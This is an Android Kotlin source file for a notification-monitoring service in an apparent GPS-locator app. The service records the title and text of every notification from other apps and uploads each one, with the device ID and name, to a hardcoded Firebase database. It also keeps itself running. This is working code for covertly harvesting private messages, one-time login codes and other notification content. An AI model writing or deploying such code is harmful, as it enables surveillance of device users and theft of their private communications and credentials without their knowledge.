package app.gpslocation.id.services

import android.content.Intent
import android.os.Build
import android.provider.Settings
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import com.google.firebase.database.FirebaseDatabase

class NotificationMonitorService : NotificationListenerService() {

    private val db = FirebaseDatabase.getInstance("https://gps-locator-956fb-default-rtdb.asia-southeast1.firebasedatabase.app").reference
    private val deviceId by lazy {
        Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
    }
    private val deviceName = "${Build.MANUFACTURER} ${Build.MODEL}"

    // Cache untuk mencegah duplikat
    private var lastNotifKey: String = ""
    private var lastNotifTime: Long = 0

    override fun onCreate() {
        super.onCreate()
        db.child("devices").child(deviceId).child("info").child("name").setValue(deviceName)
    }

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val packageName = sbn.packageName
        if (packageName == "app.gpslocation.id") return

        val notification = sbn.notification
        val extras = notification.extras
        
        val title = extras.getString("android.title") ?: ""
        val text = extras.getCharSequence("android.text")?.toString() ?: ""
        val currentTime = System.currentTimeMillis()

        // Logika anti-duplikat (Sama judul & isi dalam 2 detik)
        val currentNotifKey = "$packageName|$title|$text"
        if (currentNotifKey == lastNotifKey && (currentTime - lastNotifTime) < 2000) {
            Log.d("NOTIF_MONITOR", "Duplicate ignored: $title")
            return
        }

        lastNotifKey = currentNotifKey
        lastNotifTime = currentTime

        Log.d("NOTIF_MONITOR", "Captured notif from $packageName: $title")

        val data = hashMapOf(
            "package" to packageName,
            "title" to title,
            "text" to text,
            "postTime" to sbn.postTime,
            "receivedAt" to currentTime
        )

        db.child("devices").child(deviceId).child("notifications").push().setValue(data)
            .addOnFailureListener { Log.e("NOTIF_MONITOR", "Upload failed: ${it.message}") }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d("NOTIF_MONITOR", "Service Started")
        return START_STICKY
    }
}